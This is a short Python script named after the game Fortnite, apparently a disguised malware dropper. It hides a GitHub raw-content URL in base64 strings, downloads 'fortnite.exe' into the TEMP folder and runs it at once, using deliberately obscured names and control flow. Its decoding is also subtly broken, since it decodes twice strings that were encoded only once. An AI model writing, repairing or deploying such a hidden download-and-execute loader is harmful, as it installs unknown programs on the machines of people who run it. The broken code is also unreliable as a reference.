# fortnite.py
import base64 as b, requests as r, os, subprocess as s

# Encoded URL parts
u1 = b.b64decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t').decode('utf-8')
u2 = b.b64decode('L3Bhbm9jaG9udGFrZXNmbGlnaHQvZm9ydG5pdGUuZXhl').decode('utf-8')

# Encoded filename
encrypted_name = 'Zm9ydG5pdGUuZXhl'  # Base64-encoded 'fortnite.exe'

# Function to decode the obfuscated URL parts
def d(e):
    return b.b64decode(b.b64decode(e)).decode('utf-8')

# Function to decrypt the filename
def decrypt_filename(name):
    return b.b64decode(name.encode()).decode()

# Function to download and execute the file
def jg():
    # Decode the URL parts
    g = d(u1)
    h = d(u2)

    # Construct the full URL
    i = ''.join([g, h])

    # Dynamic code generation
    k = lambda m: r.get(m)
    
    # Obfuscated control flow
    for p in range(1):
        q = k(i)
        if q.status_code == 200:
            # Get the system's temporary directory
            t = os.getenv('TEMP')
            
            # Decrypt the filename
            exe_file_name = decrypt_filename(encrypted_name)
            exe_file_path = os.path.join(t, exe_file_name)
            
            # Write the downloaded content to the file
            with open(exe_file_path, 'wb') as u:
                u.write(q.content)
            
            print(f"File downloaded and saved to: {exe_file_path}")
            
            # Execute the .exe file
            s.run([exe_file_path], check=True)
        else:
            # Encoded error message
            print(d('RmFpbGVkIHRvIGZldGNoIGNvbnRlbnQ='))

# Execute the function
jg()
